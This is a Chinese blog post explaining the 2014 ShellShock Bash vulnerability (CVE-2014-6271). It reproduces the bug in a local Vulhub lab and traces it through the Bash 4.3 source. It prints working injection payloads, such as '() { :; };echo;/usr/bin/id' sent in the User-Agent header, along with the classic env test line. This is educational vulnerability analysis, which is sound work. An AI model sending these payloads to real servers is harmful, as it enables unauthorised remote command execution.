@@ -1,0 +1,1392 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+    
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="shellshock漏洞原理浅析, Liloong3t&#39;s Blog">
+    <meta name="baidu-site-verification" content="code-5WkfinfGVW">
+    <!-- <meta name="google-site-verification" content="" /> -->
+    <meta name="description" content="浅析shellshock漏洞原理ShellShock ( CVE-2014-6271 )虽然该漏洞的名称为 ShellShock( 中译为 “ Shell 破壳漏洞 “ ) , 但实际上是产生于 GNU BASH( Bourne Again">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>shellshock漏洞原理浅析 | Liloong3t&#39;s Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/materialize/1.0.0/css/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/aos/3.0.0-beta.6/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/lightgallery/1.6.12/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    
+    <style type="text/css">
+        
+    </style>
+
+    <script src="https://libs.baidu.com/jquery/2.1.4/jquery.min.js"></script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?46e79e71af0709a5b9106bf20cecc493";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+    <!-- 
+    
+        <script>
+            (function(){
+                var bp = document.createElement('script');
+                var curProtocol = window.location.protocol.split(':')[0];
+                if (curProtocol === 'https') {
+                    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+                }
+                else {
+                    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                }
+                var s = document.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(bp, s);
+            })();
+        </script>
+     -->
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+    <body>
+
+        <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Liloong3t's Blog</span>
+                </a>
+            </div>
+            
+
+
+<!-- <a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/AV" class="waves-effect waves-light">
+            
+            <i class="fa fa-music"></i>
+            
+            <span>视听</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/galleries" class="waves-effect waves-light">
+            
+            <i class="fa fa-photo"></i>
+            
+            <span>相册</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于我</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/contact" class="waves-effect waves-light">
+            
+            <i class="fa fa-envelope"></i>
+            
+            <span>留言板</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul> -->
+
+<!-- 支持二级菜单特性  modify 2019.09.17  -->
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right nav-menu">
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/" class="waves-effect waves-light">
+              
+                <i class="fa fa-home"></i>
+              
+              <span>首页</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/tags" class="waves-effect waves-light">
+              
+                <i class="fa fa-tags"></i>
+              
+              <span>标签</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/categories" class="waves-effect waves-light">
+              
+                <i class="fa fa-bookmark"></i>
+              
+              <span>分类</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/archives" class="waves-effect waves-light">
+              
+                <i class="fa fa-archive"></i>
+              
+              <span>归档</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/AV" class="waves-effect waves-light">
+              
+                <i class="fa fa-music"></i>
+              
+              <span>视听</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/galleries" class="waves-effect waves-light">
+              
+                <i class="fa fa-photo"></i>
+              
+              <span>相册</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/about" class="waves-effect waves-light">
+              
+                <i class="fa fa-user-circle-o"></i>
+              
+              <span>关于我</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/contact" class="waves-effect waves-light">
+              
+                <i class="fa fa-envelope"></i>
+              
+              <span>留言板</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/friends" class="waves-effect waves-light">
+              
+                <i class="fa fa-address-book"></i>
+              
+              <span>友情链接</span>
+            </a>
+
+            
+      </li>
+    
+
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Liloong3t's Blog</div>
+        <div class="logo-desc">
+            
+            武汉科技大学 | 计算机科学与技术 | 信息安全
+            
+        </div>
+    </div>
+
+    
+
+    <!-- <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/AV" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-music"></i>
+                
+                视听
+            </a>
+        </li>
+        
+        <li>
+            <a href="/galleries" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-photo"></i>
+                
+                相册
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于我
+            </a>
+        </li>
+        
+        <li>
+            <a href="/contact" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-envelope"></i>
+                
+                留言
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友链
+            </a>
+        </li>
+        
+        
+    </ul> -->
+
+   
+   
+<!-- 支持二级菜单特性  modify 2019.09.17  -->
+<ul class="menu-list mobile-menu-list">
+    
+        <li class="m-nav-item">
+                
+                    <a href="/" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-home"></i>
+                        
+                        首页
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/tags" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-tags"></i>
+                        
+                        标签
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/categories" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-bookmark"></i>
+                        
+                        分类
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/archives" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-archive"></i>
+                        
+                        归档
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/AV" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-music"></i>
+                        
+                        视听
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/galleries" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-photo"></i>
+                        
+                        相册
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/about" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-user-circle-o"></i>
+                        
+                        关于我
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/contact" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-envelope"></i>
+                        
+                        留言
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/friends" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-address-book"></i>
+                        
+                        友链
+                    </a>
+              
+            </li>
+        
+
+        
+    </ul>
+
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+        
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/5.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        shellshock漏洞原理浅析
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/漏洞/" target="_blank">
+                                <span class="chip bg-color">漏洞</span>
+                            </a>
+                        
+                            <a href="/tags/PHP/" target="_blank">
+                                <span class="chip bg-color">PHP</span>
+                            </a>
+                        
+                            <a href="/tags/Linux/" target="_blank">
+                                <span class="chip bg-color">Linux</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/blog/" class="post-category" target="_blank">
+                                blog
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-03-05
+                </div>
+
+                <div class="post-author info-break-policy">
+                    <i class="fa fa-user-o fa-fw"></i>作者:&nbsp;&nbsp;
+                    
+                        Liloong3t
+                    
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        2.5k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        9 分
+                    </div>
+                    
+                
+                
+                
+
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="浅析shellshock漏洞原理"><a href="#浅析shellshock漏洞原理" class="headerlink" title="浅析shellshock漏洞原理"></a>浅析shellshock漏洞原理</h1><h3 id="ShellShock-CVE-2014-6271"><a href="#ShellShock-CVE-2014-6271" class="headerlink" title="ShellShock ( CVE-2014-6271 )"></a><a href="https://www.exploit-db.com/exploits/34765" target="_blank" rel="noopener">ShellShock ( CVE-2014-6271 )</a></h3><p>虽然该漏洞的名称为 <code>ShellShock</code>( 中译为 “ Shell 破壳漏洞 “ ) , 但实际上是产生于 <strong><code>GNU BASH( Bourne Again Shell )</code></strong> . Bash是一个命令处理器 , 通常运行于文本窗口中 , 能执行用户输入的命令 . 有关 Bash 的相关内容可以参考 <strong><a href="https://zh.wikipedia.org/wiki/Bash" target="_blank" rel="noopener">维基百科</a></strong> , 这里就不多说了 .</p>
+<p>而 <code>ShellShock</code> 漏洞是在 2014 年 9月 被披露的 , 该漏洞最早可以追溯到 1989 年发布的 Bash 1.03 版本 , 距今已有快30年了 . 在漏洞刚被披露时 , 其严重性直接被定义为 10 级( 最高级别 ) , 要知道同年 4 月爆发的 “ OpenSSL 心脏出血 “ 漏洞才 5 级 , 可见其危害性之大 , 影响范围之广 .</p>
+<p>好了 , 不多说了 , 来看一看 <strong><code>ShellShock</code></strong> 漏洞到底是怎么一回事</p>
+<hr>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>在 <strong><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">Vulhub</a></strong> 有搭建好的 Docker 环境 , 我们可以直接运行 .</p>
+<p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-03_22-24.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-03_22-24.png" alt="img"></a></p>
+<ul>
+<li><strong>在浏览器访问 : <code>http://127.0.0.1:8000/victim.cgi</code> , 即可看到存在 <code>ShellShock</code> 漏洞的界面</strong></li>
+</ul>
+<p>  <a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-03_22-33.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-03_22-33.png" alt="img"></a></p>
+<ul>
+<li><strong>在浏览器访问 : <code>http://127.0.0.1:8000/safe.cgi</code> , 即可看到修复 <code>ShellShock</code> 漏洞后的界面</strong></li>
+</ul>
+<p>  <a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-03_22-31.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-03_22-31.png" alt="img"></a></p>
+<p>然后根据给出的 POC , 可以构造 Payload 来利用存在 <code>ShellShock</code> 漏洞的 <code>victim.cgi</code> 文件 , 如下</p>
+<p><strong>Payload : <code>() { foo; };echo;/usr/bin/id</code></strong></p>
+<p>将该 Payload 放置于 HTTP 数据报头的 <code>User-Agent</code> 字段中 , 然后通过 <code>Curl</code> 工具构造发送 .</p>
+<p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-04_14-30.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-04_14-30.png" alt="img"></a></p>
+<p>可以看到我们植入的 Payload 被成功的执行了 . 而当我们攻击安全的 <code>safe.cgi</code> 文件时 , 服务器仅会返回正常的 HTML 页面 .</p>
+<p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-04_14-35.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-04_14-35.png" alt="img"></a></p>
+<p>那么这个任意代码执行的漏洞究竟是如何产生的呢 ? 下面我们来简单分析一下 .</p>
+<hr>
+<h4 id="漏洞成因分析"><a href="#漏洞成因分析" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h4><p>在 bash 中可以自定义 Shell 变量 , 如下所示</p>
+<p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-04_14-54.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-04_14-54.png" alt="img"></a></p>
+<p>但此时该变量仅是当前 Shell 的一个局部变量 , 只有在当前 Shell 进程中可以调用 . 即使是当前 Shell Fork 出的子进程 , 也是不能访问该变量的 .</p>
+<p>为此 , 我们可以通过 export 命令 , 将该变量转变为一个环境变量 , 这样当前 Shell 的子进程就可以访问它了</p>
+<p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-04_15-00.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-04_15-00.png" alt="img"></a></p>
+<p>不仅如此 , 在 Bash 中还可以定义 Shell 函数并将其导出为环境函数 , 只需要指明 <code>-f</code> 参数即可</p>
+<p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-04_15-08.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-04_15-08.png" alt="img"></a></p>
+<p>上图这种函数的定义方法是非常普遍的 , 很容易理解 . 但在 Bash 中还有一种独有的方法来定义函数 , 即 : <strong>通过环境变量来定义函数</strong></p>
+<p>当某个环境变量的值以字符串 “ <code>() {</code> “ 的格式作为开头( 注意大括号与小括号间的空格不能少 ) , 那么该变量就会被当前 Bash 当作一个导出函数( <code>export function</code> ) , 该函数仅会在当前 Bash 的子进程中生效 . 在很多文章中会把它称为 Bash 的 “<code>自动导入机制( 自动导入函数到当前 Bash 的子进程 )</code> “</p>
+<p><em>由于 <code>ShellShock</code> 漏洞的危害性之大 , 很多 Linux 发行版都默认关闭了 Bash 的自动导入机制 , 所以下面采用 bash 4.3.0 作为实验环境</em></p>
+<p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_09-58.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_09-58.png" alt="img"></a></p>
+<p>因为这种独特的函数定义方式仅会在当前 bash 的子进程中生效 , 所以网络上很多帖子给出的 POC 都是下面这样 .</p>
+<p><strong><code>POC : env x='() { :;}; echo vulnerable' bash -c "echo this is a test"</code></strong></p>
+<pre><code>     env : 设置环境变量后执行程序
+
+     bash -c : 启动一个新的Bash , 然后执行后面的命令 . 只有子进程开启时才会其解析环境变量中函数的定义</code></pre><p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_10-11_1.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_10-11_1.png" alt="img"></a></p>
+<p>通过 <code>bash -c</code> 开启当前 Bash 的子进程 , 在子进程载入时会初始化用户环境变量 , 在初始化时发现了包含 “<code>() {</code>“ 格式的字符串 , 所以将该字符串作为一个自动导入函数 . 但由于没有判断函数定义的结束 , 所以错误的将该函数定义后的语句也初始化并当作命令执行了 . 所以子 Bash 会执行该语句并输出 <code>vulnerable</code> , 然后再输出 <code>this is a test</code> .</p>
+<p>简单的说 , 就是将恶意命令添加到合法的Bash函数定义后 , 在启动子进程时 , Bash 会先执行恶意命令 , 然后再执行正常的指令 .</p>
+<p>在 <strong><a href="https://wooyun.js.org/drops/Shellshock漏洞回顾与分析测试.html" target="_blank" rel="noopener">Shellshock漏洞回顾与分析测试</a></strong> 中有一副图做的非常棒 , 十分容易理解 , 这里贴出来 .</p>
+<p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_10-22.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_10-22.png" alt="img"></a></p>
+<p>其实这是一种注入攻击 , 其本质就是<strong>数据( 环境变量 )与代码( 恶意命令 )未分离</strong> . 攻击者可以通过构造恶意参数使得解析器错误地执行了数据中的恶意命令 .</p>
+<hr>
+<h4 id="Bash-4-3-源代码分析"><a href="#Bash-4-3-源代码分析" class="headerlink" title="Bash 4.3 源代码分析"></a>Bash 4.3 源代码分析</h4><p>上面简单的谈了下 <code>ShellShock</code> 漏洞产生的原因 , 但具体的细节还没有说清楚 . 下面针对 <code>Bash 4.3.0</code> 的源码进行分析 .</p>
+<ol>
+<li><p><strong>首先从 <a href="https://ftp.gnu.org/gnu/bash/" target="_blank" rel="noopener">GNU.ORG</a> 上下载一份 Bash 4.3 的源码</strong></p>
+</li>
+<li><p><strong><code>variables.c : 315</code></strong></p>
+<p>因为 ShellShock 触发于 Bash 子进程初始化环境变量的时候 . 所以我们进入 <code>variables.c</code> 文件 , 找到 <strong><code>initialize_shell_variables()</code></strong> 函数 .</p>
+</li>
+</ol>
+<p>   <a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_11-40.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_11-40.png" alt="img"></a></p>
+<p>   这里先定义了一些参数 , 然后循环遍历所有环境变量 , 通过 “ = “ 来分割变量名与变量值 .</p>
+<p>   <a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_11-44.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_11-44.png" alt="img"></a></p>
+<p>   注释写的很清楚 , 先判断刚才获取到的环境变量中是否有不合法的( 比如 “<code>=xxx</code>“ 或者没有等号的 ) . 如果发现不合法的变量 , 就跳过它们 .</p>
+<p>   然后会将所有合法的环境变量进行赋值操作 , 其中</p>
+<pre><code>    name : 环境变量名
+    string : 环境变量值
+    char_index : 环境变量名的长度</code></pre><p>   <a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_11-49.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_11-49.png" alt="img"></a></p>
+<p>   这里比较重要 , Google 上很多帖子也把这里作为 ShellShock 漏洞产生的地点 . 此处先判断是否存在自动导出函数( 通过 “<code>() {</code>“ 来判断 ) , 若存在就将其定义为一个函数 . 同时判断当前是否处于 <code>privileged mode</code> ,若不处于该模式就将之前导出的函数导入到新的环境变量中 .</p>
+<p>   注意这里 , string( 获取到的环境变量值 ) 没有进行任何过滤 , 就被放入到 <strong><code>parse_and_execute</code></strong> 函数中 . 这是典型的注入漏洞 .</p>
+<p>   值得一提的是这个 <code>privieged mode</code> , 因为根据源代码 , 若当前环境处于该模式下 , <code>ShellShock</code> 攻击将不会成功 .</p>
+<pre><code>    privileged mode 即为 " 特权模式 " , 要求目标进程的 real-UID 与 effective UID 一致
+
+    real-UID 指定是谁启动了目标进程 , 而 effective-UID 指定目标进程可以访问哪些资源 . 
+
+    通常情况下 , 这两个值是相同的 , 但如果调用了 setuid() 这类函数 , 那么它们的值将会发生变化</code></pre><p>   上述内容可以参考 <strong><a href="https://unixpapa.com/incnote/setuid.html" target="_blank" rel="noopener">Unix Incompatibility Notes: UID Setting Functions</a></strong></p>
+<p>   其实 , <strong><code>privileged mode</code></strong> 的值是被默认定义为 0 的 , 所以我并不明白这里的判断有什么实际含义 . 网络上也没有谁给出具体的答案 , 如果您知道 , 欢迎留言 .</p>
+<p>   <a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_13-51.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_13-51.png" alt="img"></a></p>
+<p>后面就没什么好说的了 , 我们输入的恶意代码会被带入 <code>parse_and_execute()</code> 函数 , 该函数类似其他高级语言( 例如 PHP )中的 <code>eval</code> 函数 , 能够解析并执行字符串 .</p>
+<hr>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>现在关于 ShellShock 漏洞产生的原因已经分析的差不多了 , 但是还存在一些疑问 . 比如为什么一个在 Bash 上的漏洞会影响到 Web 服务? 为什么攻击者可以通过 Web 页面攻击主机 Shell ?</p>
+<p>在 <strong><a href="https://www.guildhab.top/?p=1221" target="_blank" rel="noopener">PHP-FPM 学习笔记</a></strong> 一文中我提到过使用 CGI 脚本生成 HTML 页面的具体流程 . 其实 , 不只是 PHP , 像 Perl , Python , Bash 等脚本语言都可以用于编写 CGI 脚本 .</p>
+<p>而 Bash 可能是用于 CGI 脚本编写中最简单的语言了 . 用 Bash 来进行 CGI 编程的最大优势是它能够直接访问所有的标准 GNU 工具和系统程序 .</p>
+<p>那么为什么系统环境变量会影响到 CGI 脚本的执行呢 ?</p>
+<pre><code>     CGI 脚本会继承系统的环境变量 . CGI 环境变量在CGI程序启动时初始化 , 在结束时销毁 . 
+
+     当一个 CGI 脚本未被 HTTP 服务器调用时 , 它的环境变量几乎是系统环境变量的复制 . 当这个 CGI 脚本被 HTTP 服务器调用时 , 它的环境变量就会增加关于 HTTP 服务器 , 客户端 , CGI传输过程等条目 .</code></pre><p>具体内容可以参考 <strong><a href="https://blog.csdn.net/weixin_39609623/article/details/86312439" target="_blank" rel="noopener">WEB-CGI 详解</a></strong> 这篇文章 , 我们要知道的是 : 当 CGI 脚本接收到一次 HTTP 请求 , 它的环境变量就会新增一些条目 , 比如 <strong><code>User-Agent</code></strong> , <strong><code>Connection</code></strong> 等信息 .</p>
+<p>因此 , 在给出的 POC 中 , 我们通过修改 <strong><code>User-Agent</code></strong> 来修改 CGI 环境变量</p>
+<p><strong>Payload : <code>() { :; };echo;/usr/bin/id;</code></strong></p>
+<p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_14-56.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_14-56.png" alt="img"></a></p>
+<p>这里 <code>echo;</code> 是不可以省略的 , 相当于换行符 . HTTP Header 一行只对应一个键值对 .</p>
+<p>由于该 CGI 脚本是用 Bash 编写的 , 所以我们可以直接访问标准 GNU 工具库 , 比如 <code>/usr/bin/id</code> .</p>
+<p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_14-59-2.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_14-59-2.png" alt="img"></a></p>
+<p>这里修改 HTTP Header 的其他字段也都是可以的 , 比如现在修改 <code>Connection</code> 字段的值</p>
+<p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_15-06.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_15-06.png" alt="img"></a></p>
+<p>其实本质上都是通过修改 HTTP Header 来修改 CGI 程序的环境变量 , 间接修改 Bash 环境变量 , 触发 ShellShock 漏洞 , 执行恶意代码 .</p>
